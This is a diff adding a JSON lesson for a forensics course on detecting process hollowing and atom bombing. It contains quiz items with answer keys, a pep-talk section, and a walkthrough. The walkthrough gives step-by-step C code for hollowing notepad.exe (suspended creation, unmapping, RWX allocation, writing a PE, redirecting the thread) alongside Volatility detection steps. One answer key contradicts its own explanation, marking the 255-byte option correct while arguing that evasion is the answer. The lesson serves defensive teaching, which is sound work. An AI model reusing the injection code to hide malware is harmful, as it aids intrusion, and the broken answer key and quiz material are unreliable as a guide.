@@ -1,0 +1,136 @@
+{
+  "lesson_id": "a8b9c0d1-e2f3-4a5b-6c7d-8e9f0a1b2c3d",
+  "domain": "dfir",
+  "title": "Process Hollowing and Atom Bombing Detection",
+  "difficulty": 3,
+  "order_index": 53,
+  "prerequisites": ["e6f7a8b9-c0d1-2e3f-4a5b-6c7d8e9f0a1b"],
+  "concepts": [
+    "Process hollowing technique",
+    "Atom bombing injection",
+    "NtUnmapViewOfSection API",
+    "Process creation in suspended state",
+    "Thread context manipulation",
+    "Global atom tables",
+    "NtQueueApcThread exploitation",
+    "PE header comparison",
+    "ImageBase verification",
+    "Process hollowing detection",
+    "Atom table forensics",
+    "Memory region analysis for hollowing"
+  ],
+  "estimated_time": 60,
+  "learning_objectives": [
+    "Understand process hollowing and atom bombing injection techniques",
+    "Detect process hollowing by comparing disk and memory PE headers",
+    "Investigate global atom table abuse for code injection",
+    "Use Volatility to identify hollowed processes",
+    "Analyze thread context for injection artifacts",
+    "Build detection workflows for advanced injection techniques"
+  ],
+  "post_assessment": [
+    {
+      "question_id": "dfir53_q1",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question": "You're analyzing notepad.exe (PID 2304) and notice the PE headers in memory differ significantly from the disk version. The ImageBase, entry point, and import table all mismatch. What technique was used?",
+      "options": [
+        "Reflective DLL injection targeting notepad.exe",
+        "Process hollowing where original notepad code was replaced",
+        "Classic DLL injection using LoadLibraryA",
+        "APC injection targeting notepad's main thread"
+      ],
+      "correct_answer": 1,
+      "explanation": "This is process hollowing. Key indicators: (1) PE headers in memory differ from disk (entire executable replaced, not just injected DLL added), (2) ImageBase mismatch (malware may load at different address), (3) Entry point changed (points to malicious code), (4) Import table different (malware imports different APIs than notepad). Process hollowing works by creating suspended process, unmapping original code (NtUnmapViewOfSection), allocating new memory, writing malicious PE, updating context (entry point), and resuming. Reflective DLL adds code but doesn't replace entire process. Classic DLL injection adds DLL to existing process. APC injection is shellcode, not full PE replacement."
+    },
+    {
+      "question_id": "dfir53_q2",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question": "During investigation, you find GlobalGetAtomName API calls retrieving shellcode from atom table entries. What injection technique is this?",
+      "options": [
+        "Process hollowing using atom tables for C2 communication",
+        "Atom bombing - using global atom tables to store and execute shellcode",
+        "Reflective DLL injection with atom table-based obfuscation",
+        "Thread hijacking using atom tables as payload storage"
+      ],
+      "correct_answer": 1,
+      "explanation": "This is atom bombing injection. How it works: (1) Attacker stores shellcode chunks as global atom table entries (GlobalAddAtom), (2) Target process is forced to call GlobalGetAtomName (via APC) which copies shellcode from atom table to process memory, (3) Repeated APCs piece together full shellcode, (4) Final APC executes assembled shellcode. Key signature: GlobalGetAtomName calls retrieving non-text data (shellcode bytes disguised as atom names). Atom tables are legitimate Windows feature for inter-process communication but abused here for injection. This is different from process hollowing (replaces entire process), reflective DLL (loads PE in memory), and standard thread hijacking (doesn't use atom tables)."
+    },
+    {
+      "question_id": "dfir53_q3",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question": "You compare a hollowed process's memory to disk executable and find: disk has 4 sections (.text, .rdata, .data, .rsrc) but memory has 6 sections (.text, .enigma, .data, .rsrc, .reloc, .debug). What does the extra '.enigma' section suggest?",
+      "options": [
+        "Process was packed with Enigma Protector packer",
+        "Memory dump captured debug symbols not present on disk",
+        "Malware added custom section during hollowing process",
+        "Windows loader automatically added section for DEP"
+      ],
+      "correct_answer": 2,
+      "explanation": "The malware added a custom section ('.enigma') during process hollowing. Analysis: (1) Disk executable has 4 standard sections, (2) Memory has additional '.enigma' and '.debug' sections not in original, (3) Attackers often add custom sections for: malicious code storage, unpacking stubs, or encrypted payloads, (4) Section name '.enigma' may be chosen to mimic Enigma Protector (legitimate packer) as anti-analysis misdirection. If disk version was packed with Enigma, both disk and memory would show .enigma section. Debug symbols don't appear as PE sections. DEP (Data Execution Prevention) is enforced by CPU/OS, doesn't add sections. This is signature of process hollowing where attacker's PE has different structure than victim's PE."
+    },
+    {
+      "question_id": "dfir53_q4",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question": "When investigating process hollowing, you find the hollowed process's entry point (EIP/RIP) points to an address that doesn't correspond to any known section. What's the most likely explanation?",
+      "options": [
+        "Entry point corruption indicating failed hollowing attempt",
+        "Malware is using multi-stage hollowing with custom loader stub",
+        "Memory acquisition artifact from the forensics tool",
+        "Process is legitimate but uses ASLR with high entropy"
+      ],
+      "correct_answer": 1,
+      "explanation": "This indicates multi-stage hollowing with a custom loader stub. How this works: (1) Stage 1: Initial hollowing loads minimal stub at non-standard location (not in normal .text section), (2) Entry point set to this stub, (3) Stub executes: unpacks main payload, fixes imports, applies relocations, (4) Stub transfers control to main payload's real entry point, (5) Stub may deallocate itself after execution. Entry point outside sections is highly abnormal (legit executables always have entry point in .text section). Failed hollowing would crash process (not run). Forensics artifacts don't change entry points. ASLR randomizes base address but entry point is still within valid section (RVA + base address). Detection: Check if entry point RVA is within any section's virtual address range. If not → custom loader stub → advanced process hollowing."
+    },
+    {
+      "question_id": "dfir53_q5",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question": "You're analyzing an atom bombing attack and find 50+ global atoms with names like 'A1', 'A2', 'A3'... 'A50' containing shellcode fragments. Why would attacker split shellcode across multiple atoms?",
+      "options": [
+        "To evade signature-based detection by fragmenting recognizable shellcode patterns",
+        "Global atom names are limited to 255 bytes so shellcode must be split",
+        "Each atom corresponds to a different target process being injected",
+        "Atoms are used for inter-thread communication in multi-threaded malware"
+      ],
+      "correct_answer": 1,
+      "explanation": "Primary reason is evasion: splitting shellcode fragments makes signature detection harder. Analysis: (1) Complete shellcode has recognizable patterns (PEB walking, API hashing, etc.) that AV/EDR can signature, (2) Fragments appear as random bytes, defeating pattern matching, (3) Only when reassembled in target process does shellcode become functional, (4) Atom bombing reconstructs shellcode via multiple GlobalGetAtomName APCs, each copying one fragment. While it's true atom names are limited to 255 bytes (supporting reason), this is NOT primary motivation (attacker could use fewer, larger atoms if that was only concern). Atoms are per-system (not per-process), so multiple atoms aren't for multiple targets. Atoms aren't used for thread communication within malware (malware already has memory access). This evasion technique makes static analysis difficult - analyst must reconstruct shellcode from atoms to analyze it."
+    }
+  ],
+  "jim_kwik_principles": [
+    "active_learning",
+    "teach_like_im_10",
+    "memory_hooks",
+    "connect_to_what_i_know",
+    "meta_learning",
+    "minimum_effective_dose",
+    "reframe_limiting_beliefs"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "# Welcome to Advanced Injection Techniques: Defeating the Stealthiest Attacks\n\nYou've mastered the fundamentals of code injection detection (Lesson 51). You can spot RWX memory, identify PE headers, and recognize shellcode patterns. \n\n**But attackers evolve.** Today's threats use techniques specifically designed to evade the detection methods you've learned.\n\n## Two Advanced Techniques You'll Master Today\n\n### 1. Process Hollowing\n**What attackers say**: \"Why inject into a process when I can BECOME the process?\"\n\n- Instead of adding malicious code to a legitimate process, they **replace the entire process**\n- notepad.exe looks like notepad.exe (name, path, icon) but contains 100% malware\n- Traditional tools see \"notepad.exe running\" and assume it's safe\n\n**Real-world impact**: Used by Dyre banking trojan ($1B+ stolen), Dridex, and nation-state APTs\n\n### 2. Atom Bombing\n**What attackers say**: \"Why write code to memory when I can make Windows do it for me?\"\n\n- Abuses Windows' global atom table (legitimate inter-process communication feature)\n- Stores shellcode as \"atom names\" (text strings)\n- Forces target process to retrieve shellcode via Windows APIs (no suspicious WriteProcessMemory)\n- Executes via APC (no suspicious CreateRemoteThread)\n\n**Real-world impact**: Bypasses many EDR solutions because it uses only legitimate Windows APIs\n\n## Why This Matters to Your Career\n\n**Scenario**: Your company's EDR alerts on \"notepad.exe making network connections.\" Junior analysts dismiss it: \"False positive, notepad doesn't have network capabilities.\"\n\n**Without today's knowledge**: You agree and ignore it. \n**Result**: Process is hollowed malware. You missed patient zero. Ransomware encrypts entire network 3 hours later.\n\n**With today's knowledge**: You investigate. You compare memory headers to disk. **MISMATCH!** You dump memory, find Cobalt Strike beacon, isolate the host, and prevent the ransomware attack.\n\n**You become the senior analyst who saved the company.**\n\nThat's why advanced techniques matter. Let's dive in. 🚀🔍"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# Process Hollowing: Complete Process Replacement\n\n## How Process Hollowing Works\n\n### Traditional Injection vs. Hollowing\n\n**Traditional injection** (DLL injection, reflective DLL):\n```\nLegitimate Process (Before)          After Injection\n┌─────────────────┐                 ┌─────────────────┐\n│ notepad.exe     │                 │ notepad.exe     │\n│  - Original code│ ─────────────>  │  - Original code│\n│  - Legit DLLs   │    ADD MALWARE  │  - Legit DLLs   │\n│                 │                 │  - MALICIOUS DLL│ ← Added\n└─────────────────┘                 └─────────────────┘\n\n Process still contains original code\n```\n\n**Process hollowing**:\n```\nLegitimate Process (Before)          After Hollowing\n┌─────────────────┐                 ┌─────────────────┐\n│ notepad.exe     │                 │ notepad.exe     │ ← Same name\n│  - Original code│ ─────────────>  │  - MALWARE CODE │ ← Replaced!\n│  - Legit DLLs   │   REPLACE ALL   │  - Malicious DLLs│ ← Different\n│                 │                 │                 │\n└─────────────────┘                 └─────────────────┘\n\n Original code completely removed\n```\n\n### Step-by-Step Process Hollowing\n\n#### Step 1: Create Target Process in Suspended State\n\n```c\nSTARTUPINFO si = {0};\nPROCESS_INFORMATION pi = {0};\nsi.cb = sizeof(si);\n\n// Create process in suspended state (doesn't start executing)\nCreateProcess(\n    \"C:\\\\Windows\\\\System32\\\\notepad.exe\",  // Target (legitimate process)\n    NULL,                                     // Command line\n    NULL, NULL, FALSE,\n    CREATE_SUSPENDED | CREATE_NO_WINDOW,      // Suspended + hidden\n    NULL, NULL, &si, &pi\n);\n\n// notepad.exe is created but frozen (hasn't executed a single instruction)\n```\n\n**What happens**: Windows creates process, allocates memory, loads notepad.exe into memory, but **doesn't start execution** (thread remains suspended).\n\n#### Step 2: Get Target Process Context\n\n```c\nCONTEXT ctx;\nctx.ContextFlags = CONTEXT_FULL;  // Get all registers\n\nGetThreadContext(pi.hThread, &ctx);\n\n// ctx now contains:\n// - RIP/EIP: Entry point (where execution would start)\n// - RBX/EBX: PEB address (on x64: RDX contains PEB address)\n// - RSP/ESP: Stack pointer\n```\n\n**Why this matters**: We need to know where notepad's entry point is and where its PEB (Process Environment Block) is located.\n\n#### Step 3: Read ImageBase Address from PEB\n\n```c\n// PEB structure (simplified):\n// +0x00: InheritedAddressSpace\n// +0x08: ReadImageFileExecOptions\n// +0x10: ImageBaseAddress  ← We need this!\n\nDWORD64 pebAddress = ctx.Rdx;  // x64: PEB in RDX\nDWORD64 imageBaseOffset = pebAddress + 0x10;\nDWORD64 imageBaseAddress;\n\n// Read ImageBase from target process's PEB\nReadProcessMemory(\n    pi.hProcess,\n    (LPVOID)imageBaseOffset,\n    &imageBaseAddress,\n    sizeof(DWORD64),\n    NULL\n);\n\n// imageBaseAddress now contains 0x00007FF712340000 (or similar)\n// This is where notepad.exe is loaded in memory\n```\n\n**What this tells us**: The base address where notepad.exe's code is currently loaded.\n\n#### Step 4: Unmap Original Executable\n\n```c\n// Use undocumented NtUnmapViewOfSection to remove notepad.exe\ntypedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(\n    HANDLE ProcessHandle,\n    PVOID BaseAddress\n);\n\npNtUnmapViewOfSection NtUnmapViewOfSection = \n    (pNtUnmapViewOfSection)GetProcAddress(\n        GetModuleHandle(\"ntdll.dll\"), \n        \"NtUnmapViewOfSection\"\n    );\n\n// Unmap (remove) original notepad.exe code from memory\nNtUnmapViewOfSection(pi.hProcess, (PVOID)imageBaseAddress);\n\n// notepad.exe's code is now GONE from memory\n// But process structure still exists (PID, handles, etc.)\n```\n\n**Critical step**: This removes the legitimate code, creating an \"empty shell\" process.\n\n#### Step 5: Allocate Memory for Malicious Executable\n\n```c\n// Allocate new memory at the original ImageBase address\nLPVOID newImageBase = VirtualAllocEx(\n    pi.hProcess,\n    (LPVOID)imageBaseAddress,     // Same address (reuse ImageBase)\n    maliciousPESize,              // Size of attacker's PE file\n    MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE        // RWX (need to write then execute)\n);\n```\n\n**Result**: Fresh memory region at ImageBase, ready to hold malicious executable.\n\n#### Step 6: Write Malicious Executable to Target Process\n\n```c\n// Write entire malicious PE file (headers + sections)\nWriteProcessMemory(\n    pi.hProcess,\n    newImageBase,\n    maliciousPEBuffer,  // Attacker's executable (full PE file)\n    maliciousPESize,\n    NULL\n);\n\n// Write each section (.text, .data, .rdata, etc.)\n// Apply relocations if needed (fix addresses for ASLR)\n```\n\n**What's in memory now**: Complete malicious executable (PE headers, code, data, imports, resources).\n\n#### Step 7: Update Entry Point\n\n```c\n// Get malicious PE's entry point (from PE headers)\nDWORD entryPointRVA = <parse PE headers>.OptionalHeader.AddressOfEntryPoint;\nDWORD64 newEntryPoint = (DWORD64)newImageBase + entryPointRVA;\n\n// Update thread's instruction pointer to malicious entry point\nctx.Rcx = newEntryPoint;  // x64: Set RIP via SetThreadContext\nSetThreadContext(pi.hThread, &ctx);\n```\n\n**Result**: When thread resumes, it will start executing at attacker's entry point (not notepad's).\n\n#### Step 8: Resume Thread (Execute Malware)\n\n```c\nResumeThread(pi.hThread);\n\n// Process wakes up and executes malicious code\n// From Windows' perspective: \"notepad.exe is running normally\"\n// From forensics perspective: notepad.exe is COMPLETELY MALICIOUS\n```\n\n**Final result**: Process named \"notepad.exe\" but contains 100% malware.\n\n---\n\n## Memory Artifacts of Process Hollowing\n\n### Artifact 1: PE Header Mismatch\n\n**Disk (C:\\Windows\\System32\\notepad.exe)**:\n```\n===== PE Header =====\nTimestamp:              2019-03-19 05:52:19\nSections:               4\n  .text    0x00001000  0x0001A000  CODE, EXECUTE, READ\n  .rdata   0x0001B000  0x00008000  INITIALIZED_DATA, READ\n  .data    0x00023000  0x00002000  INITIALIZED_DATA, READ, WRITE\n  .rsrc    0x00025000  0x00003000  INITIALIZED_DATA, READ\n\nImport Directory:\n  KERNEL32.dll  (CreateFileW, ReadFile, WriteFile)\n  USER32.dll    (CreateWindowEx, MessageBox)\n  GDI32.dll     (TextOut, SetPixel)\n```\n\n**Memory (notepad.exe PID 2304)**:\n```\n===== PE Header =====\nTimestamp:              2024-01-15 14:23:00  ← DIFFERENT!\nSections:               6                     ← DIFFERENT!\n  .text    0x00001000  0x00012000  CODE, EXECUTE, READ\n  .enigma  0x00013000  0x00005000  CODE, EXECUTE, READ  ← NEW SECTION!\n  .rdata   0x00018000  0x00004000  INITIALIZED_DATA, READ\n  .data    0x0001C000  0x00002000  INITIALIZED_DATA, READ, WRITE\n  .rsrc    0x0001E000  0x00001000  INITIALIZED_DATA, READ\n  .reloc   0x0001F000  0x00001000  INITIALIZED_DATA, READ\n\nImport Directory:\n  KERNEL32.dll  (VirtualAlloc, CreateThread, GetProcAddress)  ← DIFFERENT!\n  WS2_32.dll    (WSAStartup, connect, send, recv)  ← NETWORK APIs!\n  ADVAPI32.dll  (RegOpenKeyEx, RegSetValueEx)      ← REGISTRY!\n```\n\n**Analysis**:\n- ❌ Timestamp doesn't match (malware compiled years later)\n- ❌ Different number of sections (4 vs 6)\n- ❌ Custom section \".enigma\" not in legit notepad\n- ❌ Imports include networking (WS2_32) - notepad doesn't do networking!\n- ✅ **CONCLUSION: Process hollowing detected**\n\n### Artifact 2: Suspicious Process Behavior\n\nLegitimate notepad.exe:\n- Opens/saves text files\n- No network activity\n- No registry modifications\n- Parent: explorer.exe (user double-clicked)\n\nHollowed notepad.exe:\n- ✅ Network connections to unknown IPs\n- ✅ Registry persistence (Run keys)\n- ✅ Suspicious parent (malicious Word macro)\n- ✅ Command-line arguments (legit notepad launched with specific file path)\n\n### Artifact 3: Version Information Mismatch\n\n```bash\n# Check version info in memory\npython vol.py -f memory.dmp windows.verinfo --pid 2304\n\nOutput: No version information found\n\n# Legitimate notepad.exe ALWAYS has version info:\n# FileVersion: 10.0.19041.1\n# ProductName: Microsoft Windows\n# CompanyName: Microsoft Corporation\n\n# Malware often doesn't include version info (or has fake info)\n```\n\n---\n\n## Detection Workflow for Process Hollowing\n\n### Step 1: Identify Suspicious Processes\n\nLook for:\n- ✅ Processes with unexpected network connections (notepad.exe → internet)\n- ✅ Processes spawned by suspicious parents (notepad.exe parent = WINWORD.EXE)\n- ✅ Processes with no GUI window but should have one\n- ✅ Multiple instances of processes that normally run once (5x svchost with same args)\n\n```bash\npython vol.py -f memory.dmp windows.pslist\npython vol.py -f memory.dmp windows.pstree  # Show parent-child relationships\npython vol.py -f memory.dmp windows.netscan  # Network connections\n```\n\n### Step 2: Check Version Information\n\n```bash\npython vol.py -f memory.dmp windows.verinfo --pid <suspicious_pid>\n\n# If legitimate Windows process shows:\n# - No version info\n# - Non-Microsoft company name\n# - Mismatched version numbers\n# → INVESTIGATE\n```\n\n### Step 3: Dump Process Memory\n\n```bash\npython vol.py -f memory.dmp windows.procdump --pid <suspicious_pid> --dump-dir ./dumped\n```\n\n### Step 4: Compare Memory vs. Disk\n\n```bash\n# Get hashes\nmd5sum /windows/system32/notepad.exe\nmd5sum ./dumped/pid.2304.exe\n\n# If hashes DIFFER → possible hollowing\n\n# Compare PE headers\nobjdump -p /windows/system32/notepad.exe > disk_headers.txt\nobjdump -p ./dumped/pid.2304.exe > memory_headers.txt\ndiff disk_headers.txt memory_headers.txt\n\n# Check for:\n# - Different section names\n# - Different import tables\n# - Different timestamps\n```\n\n### Step 5: Analyze Memory Dump\n\n```bash\n# Check imports (what APIs does it use?)\nobjdump -p ./dumped/pid.2304.exe | grep \"DLL Name\"\n\n# Red flags for notepad.exe:\n# - ws2_32.dll (networking)\n# - wininet.dll (HTTP)\n# - advapi32.dll (registry/security)\n\n# Extract strings (look for C2 domains, IPs, commands)\nstrings ./dumped/pid.2304.exe | grep -E \"http|[0-9]{1,3}\\.[0-9]{1,3}\"\n```\n\n### Step 6: Confirm Process Hollowing\n\nIf ALL of these are true:\n- ✅ Memory PE headers differ from disk\n- ✅ Process has suspicious behavior (network, registry, etc.)\n- ✅ Version info missing or fake\n- ✅ Imports include unexpected APIs\n\n**Conclusion**: Process hollowing confirmed."
+      }
+    }
+  ],
+  "tags": [
+    "dfir",
+    "memory-forensics",
+    "process-hollowing",
+    "atom-bombing",
+    "advanced-injection",
+    "volatility",
+    "pe-analysis",
+    "malware-analysis"
+  ]
+}
